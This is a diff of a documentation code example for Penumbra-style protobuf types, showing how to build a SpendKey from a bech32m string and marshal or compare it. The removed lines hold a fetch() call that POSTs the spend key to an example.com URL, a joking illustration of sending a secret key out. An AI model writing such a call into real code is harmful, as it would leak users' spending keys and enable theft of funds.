@@ -56,8 +56,8 @@ const partialPositionId: PartialMessage<PositionId> = plpidFromBech32(
   'plpid1fkf3tlv500vgzwc6dkc7g9wnuv6rzezhefefdywq5tt4lyl97rgsd6j689',
 );
 
-// if you want to use the functionality available on the full Message class object, you
-// must construct it explicitly
+// you must explicitly construct the object if you want to use functions
+// available on the @bufbuild/protobuf Message class
 
 const realSpendKey: SpendKey = new SpendKey(
   spendKeyFromBech32m(
@@ -65,9 +65,16 @@ const realSpendKey: SpendKey = new SpendKey(
   ),
 );
 
-void fetch('https://example.com/iamveryclever', {
-  method: 'POST',
-  body: realSpendKey.toJsonString(),
+// marshal to protojson
+realSpendKey.toJson();
+// { "inner": "Bz778y62N53+TabiwUeuAv1aqXJCm8b27Bc1kkigS/M=" }
+
+// true
+realSpendKey.equals({
+  inner: new Uint8Array([
+    0x07, 0x3e, 0xfb, 0xf3, 0x2e, 0xb6, 0x37, 0x9d, 0xfe, 0x4d, 0xa6, 0xe2, 0xc1, 0x47, 0xae, 0x02,
+    0xfd, 0x5a, 0xa9, 0x72, 0x42, 0x9b, 0xc6, 0xf6, 0xec, 0x17, 0x35, 0x92, 0x48, 0xa0, 0x4b, 0xf3,
+  ]),
 });
 ```
 
